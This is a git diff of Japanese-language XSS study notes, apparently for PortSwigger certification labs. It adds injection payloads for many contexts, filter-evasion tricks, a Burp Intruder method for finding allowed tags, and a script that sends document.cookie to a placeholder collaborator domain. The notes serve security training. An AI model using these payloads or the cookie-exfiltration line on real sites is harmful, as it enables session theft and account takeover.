@@ -3,7 +3,7 @@
 
 # Detect
 
-[💥XSS](💥XSS.md)
+[XSS](XSS.md)
 
 🚨必ず一読：[🔍 Recon](../../../BSCP/cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)
 # 注目ポイント
@@ -60,13 +60,13 @@ HTTP headerも追加する場合
 #### Comment機能
 
 - Comment、Websiteのパラメタ値をScan 
-	- OAST：[💥XSS](💥XSS.md#Comment機能の場合)
+	- OAST：[XSS](XSS.md#Comment機能の場合)
 	- 通常↓
 ![[Pasted image 20240208110822.png | 400]]
 
 ##### Cookieが`username:token`の場合
 
-- `username`をScan selected insertion point ->[💥XSS](💥XSS.md#Cookieがusername%20tokenの場合)
+- `username`をScan selected insertion point ->[XSS](XSS.md#Cookieがusername%20tokenの場合)
 
 ### DOM-based XSS
 
@@ -148,19 +148,208 @@ eval(atob("base64エンコードした上記2つのペイロード"))
 ---
 ### 基本形
 
-オンライン上の簡潔なcheatsheetと日本人のcheatsheet見つつ...
+## HTMLタグ内でのXSS
 
-###### HTMLへのXSS : Tag is not allowed || Event is not allowed
+##### 🚨：HTMLタグ内でのXSSペイロード注入時の注意点
 
-- [XSS contexts](../../../OSCP/Cheatsheet/Web%20App/XSS%20contexts.md#HTMLタグ内でのXSS)のHTMLタグ内のXSSメソドロジーかも
+- HTML内に注入される時、タグは`>`だけで閉じることができる
+```html
+<h1>0 search results for 'ユーザの入力'</h1>
+```
+のとき、
+```
+"><body onresize=print()>"
+```
 
-###### インプットがHTMLエンコードされる
+- [🔍 Recon](../../../BSCP/cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)
 
-[XSS contexts](../../../OSCP/Cheatsheet/Web%20App/XSS%20contexts.md#引用符がエスケープされるケース)
+---
+### HTMLタグ内のXSSメソドロジー
 
-###### JavaScript内部へのXSS
+1. 有効なtagを割り出す。[xss cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてPayload settingsにペースト
+```http
+GET /?search=<§§> HTTP/2
+...
+```
 
-- [XSS contexts](../../../OSCP/Cheatsheet/Web%20App/XSS%20contexts.md#JavaScriptへのXSS)
+2. 有効なeventを割り出す。cheat sheetのCopy events to clipboardしてペースト(`%20`=空白)
+```http
+GET /?search=<有効なタグ%20§§=1> HTTP/2
+...
+```
+
+3. [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なpayload候補を取得する。
+4. コンテキストに合わせ改変したペイロードをエクスプロイトサーバにホストしてView Exploitで検証する[4. XSS contexts](#🚨：HTMLタグ内でのXSSペイロード注入時の注意点)
+```html
+<iframe src="https://0a4b003c0362b495817bca6e00b4007f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
+---
+#### すべてのタグが禁止されている場合
+
+すべて禁止されてはないけどXSS cheat sheetに有効そうなタグがないときも
+
+- custom tagを使用する
+- エクスプロイトサーバにホストしdeliver
+```html
+<script>
+	location = 'https://TARGET_NET/?search=<xss+id=x+onfocus=document.location='https://COLLABORATOR_DOMAIN/?c='+document.cookie tabindex=1>#x';
+</script>
+```
+
+---
+## HTMLタグ属性内のXSS
+
+- `<>`は注入不可でも、引用符を注入できる場合、新たな属性を追加する
+🚨開発者ツールで注入後のコンテキストを確認し、文法は維持すること
+
+- 例
+```html
+<input type="text" value="user_input_here" name="username"> 
+```
+	↓
+```html
+<input type="text" value="" autofocus onfocus=alert(document.cookie) x="" name="username"> 
+```
+
+### href属性のケース
+
+```html
+<a href="javascript:alert(document.cookie)">
+```
+- ↓リンクをクリックしたらスクリプトが実行される
+![[Pasted image 20231226192331.png | 200]]
+
+---
+### headタグ内にcanonicalが設定されているケース
+
+1. `<head>`タグ内に`canonical`が設定されていることを確認する
+2. 適当なクエリストリングを検索し、`<link rel="canonical" href="">`のhrefに反映されるか試す
+```html
+<link rel="canonical" href='https://example/?aaa'/>
+```
+
+3. hrefに反映されることを悪用し、payloadを注入する。
+```
+http://example/?'accesskey='x'onclick='alert(1)
+```
+	↓
+```html
+<link rel="canonical" href="https://example/?" accesskey="x" onclick="alert(1)">
+```
+
+---
+## JavaScriptへのXSS
+
+### 既存のスクリプトを強制終了させ任意のJSを実行する方法
+
+1. スクリプト内にユーザが制御可能(入力等)な値が存在する箇所を見つける
+```js
+<script> 
+... var input = 'ここに入力'; 
+... 
+</script>
+```
+
+2. 既存のスクリプトを閉じさせてペイロードを注入する
+```js
+</script><img src=1 onerror=alert(document.cookie)>
+```
+
+---
+### 引用符('or")で囲まれた文字列からの脱却
+
+###### 基本的な文字列からの脱却
+
+```js
+'-alert(1)-'
+```
+```js
+';alert(1)//
+```
+- 前後に適当な文字列を入れる場合もある(`aa'-alert(1)-'aa)
+
+###### 引用符がエスケープされるケース
+
+1. 引用符(`'`or`"`)を入力し、`\`でエスケープされることを確認する
+2. `\`を入力し、エスケープされない脆弱性があるか確認する
+3. 基本的なpayloadに`\`を追加して送信する
+```js
+\';alert(1)//'
+```
+
+---
+### HTMLエンコードの利用
+
+- 引用符で囲まれた属性値にJavaScriptが存在するとき
+```html
+<a href="#" onclick="... var input='ここに入力'; ...">
+```
+
+- 引用符をHTMLエンコードして脱却
+```js
+&apos;-alert(1)-&apos;
+```
+- [4. XSS contexts](#基本的な文字列からの脱却)の引用符をHTMLエンコードする
+- URLとして組み込む場合は自然な形式となるようにクエリストリングに注入する
+```url
+http://foo?&apos;-alert(1)-&apos;
+```
+- [LAB](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
+###### 利用可能なケース
+
+- イベントハンドラのように、
+- 引用符で既存のJSを抜け出すために、引用符をHTMLエンコードした形式で入力する
+
+---
+### JSテンプレートリテラルの利用
+
+###### 利用可能なケースと特徴
+
+- 入力した内容がテンプレートリテラル([JavaScriptとJSON](../../../BSCP/Misc/JavaScriptとJSON.md#テンプレートリテラルとは))に埋め込まれているケース
+- 他のテクニックと違って、既存のJSを終了させる必要がない。
+
+###### 方法
+
+- \`\`で囲まれている入力可能な場所に、`${}`でJSの式を埋め込む
+```js
+<script> 
+... 
+var input = `ここに入力`; 
+...
+</script>
+```
+	↓
+```js
+${alert(1)}
+```
+
+---
+## Misc
+
+###### 難読化
+
+```js
+<img src=1 onerror=alert(1)>
+```
+	↓
+```js
+<img src=1 oNeRrOr=alert`1`)
+```
+- alertはテンプレートリテラルを使用。alertという関数の引数としてバッククウォートで囲まれた1を渡す
+
+- その他 [XSS cheat sheet Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation:~:text=27%27%3B%22%3EXSS%3C/a%3E-,Obfuscation,-Data%20protocol%20inside)
+- [OWASP XSS Filter Evasion](### Filter Bypass Alert Obfuscation[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#filter-bypass-alert-obfuscation "Permanent link"))
+
+###### クエリストリングへの埋め込み
+
+```http
+/any?xss='><script>alert(1)</script>
+```
+
+###### もしURLエンコードされて実行されないならWebキャッシュポイズニング
+
+- [3. 実装の欠陥の悪用](../../../BSCP/Advanced/Web%20cache%20poisoning/4.%20キャッシュ実装の欠陥の悪用/3.%20実装の欠陥の悪用.md#正規化されたCache%20keyの悪用)
 
 ###### Stay-logged-in Cookieを取得
 
@@ -172,7 +361,6 @@ eval(atob("base64エンコードした上記2つのペイロード"))
 ```
 
 2. エクスプロイトサーバのAccess logを確認し、Cookieを入手する
-3. [⚡️Authentication](../../../BSCP/Server-side/Authentication/⚡️Authentication.md#Stay-logged-inから入る場合)へ
 
 ---
 
